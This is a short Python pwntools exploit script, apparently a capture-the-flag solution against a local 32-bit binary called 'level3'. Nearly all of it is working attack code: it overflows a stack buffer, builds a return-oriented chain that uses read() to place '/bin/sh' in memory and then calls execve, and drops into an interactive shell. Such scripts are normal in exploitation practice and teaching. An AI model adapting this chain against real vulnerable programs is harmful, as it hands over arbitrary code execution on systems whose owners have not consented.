#!/usr/bin/env python
from pwn import *
context(arch='i386', os='linux')

# Start the program as a subprocess
# so we can communicate with it
p = process('level3')

# Optional: attach GDB to the process and run some GDB commands
#gdb.attach(p, '''
#    b *0x8048504
#''')

execve = p32(0x8048410)
read = p32(0x80483b0)
buf = p32(0x0804a038)
pop3ret = p32(0x804864d)

print p.recvline()

#p.sendline('A'*(0x58+4) + read + system + p32(0) + buf + p32(10))

explt = 'A'*(0x6c+4)
explt += read + pop3ret + p32(0) + buf + p32(10)
explt += execve + 'AAAA' + buf + p32(0) + p32(0)
p.sendline(explt)
p.sendline('/bin/sh\0')
p.interactive()
p.close()
